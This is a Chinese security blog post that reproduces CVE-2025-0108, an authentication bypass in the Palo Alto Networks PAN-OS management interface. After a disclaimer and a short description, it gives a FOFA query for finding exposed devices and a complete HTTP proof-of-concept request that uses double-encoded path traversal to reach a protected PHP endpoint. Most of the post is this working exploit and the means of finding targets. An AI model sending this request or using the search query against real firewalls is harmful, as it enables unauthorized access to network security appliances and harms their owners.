#  漏洞复现 || Palo Alto Networks PAN-OS Management 管理端权限绕过   
韩文庚  我爱林   2025-02-20 12:20  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
Palo Alto Networks PAN-OS GlobalProtect 是Palo Alto Networks 的一款防火墙产品。2025年2日，互联网上披露 CVE-2025-0108 Palo Alto Networks PAN-OS Management 管理端权限绕过漏洞。攻击者可构造恶意请求绕过身份认证进入后台，执行恶意操作  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlO3hcKay5xUL4CFL5X6nzya8MGsVMF6mmwTquB1VDofsaoI1fhZ2FPg9XLs6S7Zm3fnLwrRr20DIg/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： "Palo Alto Networks"
```  
## 漏洞复现  
  
1.利用如下PO  
C进行权限绕过  
```
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
Host: {{hostname}}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlO3hcKay5xUL4CFL5X6nzyamxygMjVtTcvQLej2o1zujF6DhJz4tLwOpS7I57rRcyT876zNvBicOWw/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
